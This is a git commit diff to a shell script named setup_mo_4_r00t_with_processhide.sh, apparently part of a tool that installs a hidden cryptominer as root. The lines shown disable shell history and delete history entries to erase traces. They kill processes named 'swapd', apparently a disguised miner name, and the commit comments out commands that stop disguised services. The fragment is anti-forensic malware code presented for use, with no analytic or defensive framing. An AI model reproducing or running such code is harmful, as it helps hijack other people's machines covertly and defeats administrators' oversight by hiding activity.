0a3861f5ef9b48dd5b0519dd56a8564adb579ffb
Acen <113854209+littlAcen@users.noreply.github.com>
2024-05-19 16:16:13 +0200

    Update setup_mo_4_r00t_with_processhide.sh

--- setup_mo_4_r00t_with_processhide.sh
+++ setup_mo_4_r00t_with_processhide.sh
@@ -4,8 +4,8 @@ unset HISTFILE
 unset HISTFILE ;history -d $((HISTCMD-1))
 export HISTFILE=/dev/null ;history -d $((HISTCMD-1))
 
-systemctl disable gdm2 --now
-systemctl disable swapd --now
+#systemctl disable gdm2 --now
+#systemctl disable swapd --now
 
 #killall swapd
 kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
